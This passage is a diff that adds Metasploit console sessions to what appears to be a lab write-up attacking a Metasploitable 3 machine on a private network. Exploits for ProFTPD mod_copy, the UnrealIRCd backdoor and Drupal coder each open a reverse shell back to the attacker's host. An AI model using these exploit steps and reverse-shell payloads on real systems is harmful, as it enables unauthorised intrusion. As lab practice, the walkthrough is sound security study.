@@ -84,3 +84,152 @@ Nmap done: 1 IP address (1 host up) scanned in 148.33 seconds
 ```
 
 # Metasploit Exploitation
+## Active reconnaissance, initial access and expolitation
+FTP - 
+ProFTPD 1.3.5 is an FTP server software that was found to have a critical vulnerability (CVE-2015-3306) allowing remote attackers to read and write arbitary files.
+```
+msf exploit(unix/ftp/proftpd_modcopy_exec) > options
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www/        yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+Payload options (cmd/unix/reverse_netcat):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.145    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+Exploit target:
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS meta3
+RHOSTS => meta3
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
+SITEPATH => /var/www/html
+msf exploit(unix/ftp/proftpd_modcopy_exec) > exploit
+[*] Started reverse TCP handler on 192.168.0.145:4444 
+[*] 192.168.0.197:80 - 192.168.0.197:21 - Connected to FTP server
+[*] 192.168.0.197:80 - 192.168.0.197:21 - Sending copy commands to FTP server
+[*] 192.168.0.197:80 - Executing PHP payload /j5rRMj.php
+[+] 192.168.0.197:80 - Deleted /var/www/html/j5rRMj.php
+[*] Command shell session 2 opened (192.168.0.145:4444 -> 192.168.0.197:60463) at 2026-06-09 18:40:57 +0530
+[*] Exploit completed.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  2         shell cmd/unix               192.168.0.145:4444 -> 192.168.0.197:60463 (192.168.0.197)
+
+msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 2
+[*] Starting interaction with 2...
+
+whoami
+www-data
+```
+# IRC Exploitation 
+```
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   6667             yes       The target port (TCP)
+Payload options (cmd/linux/http/x86/meterpreter/reverse_tcp):
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
+   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
+   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-search, shell)
+   FETCH_SRVHOST                    no        Local IP to use for serving payload
+   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
+   FETCH_URIPATH                    no        Local URI to use for serving payload
+   LHOST                            yes       The listen address (an interface may be specified)
+   LPORT           4444             yes       The listen port
+   When FETCH_COMMAND is one of CURL,GET,WGET:
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.
+   When FETCH_FILELESS is none:
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   FETCH_FILENAME      QFfanZGBis       no        Name to use on remote system when storing payload; cannot contain spaces or slashes
+   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces
+Exploit target:
+   Id  Name
+   --  ----
+   0   Linux/Unix Command
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS meta3
+RHOSTS => meta3
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.0.145
+LHOST => 192.168.0.145
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6697
+RPORT => 6697
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
+[*] Started reverse TCP handler on 192.168.0.145:4444 
+[*] 192.168.0.197:6697 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.0.197:6697 - Connected to 192.168.0.197:6697
+[*] 192.168.0.197:6697 - Trying to register a new IRC user: serita
+[+] 192.168.0.197:6697 - The target appears to be vulnerable. UnrealIRCd detected after registration
+[*] 192.168.0.197:6697 - Connected to 192.168.0.197:6697
+[*] 192.168.0.197:6697 - Sending IRC backdoor command
+[*] Sending stage (1062760 bytes) to 192.168.0.197
+[*] Meterpreter session 1 opened (192.168.0.145:4444 -> 192.168.0.197:60503) at 2026-06-09 19:43:24 +0530
+
+meterpreter > shell
+Process 2487 created.
+Channel 1 created.
+whoami
+boba_fett
+```
+Internet relay chat backdoor, for version 3.2.8.1 was famous
+
+# Drupal exploitation
+```
+msf exploit(unix/webapp/drupal_coder_exec) > options
+
+Module options (exploit/unix/webapp/drupal_coder_exec):
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The target URI of the Drupal installation
+   VHOST                       no        HTTP server virtual host
+Payload options (cmd/unix/reverse_bash):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.145    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/webapp/drupal_coder_exec) > set TARGETURI /drupal/
+TARGETURI => /drupal/
+msf exploit(unix/webapp/drupal_coder_exec) > set RHOSTS meta3
+RHOSTS => meta3
+msf exploit(unix/webapp/drupal_coder_exec) > exploit
+[*] Started reverse TCP handler on 192.168.0.145:4444 
+[*] Cleaning up: [ -f coder_upgrade.run.php ] && find . \! -name coder_upgrade.run.php -delete
+[*] Command shell session 1 opened (192.168.0.145:4444 -> 192.168.0.197:60547) at 2026-06-09 20:19:18 +0530
+
+whoami
+www-data
+```
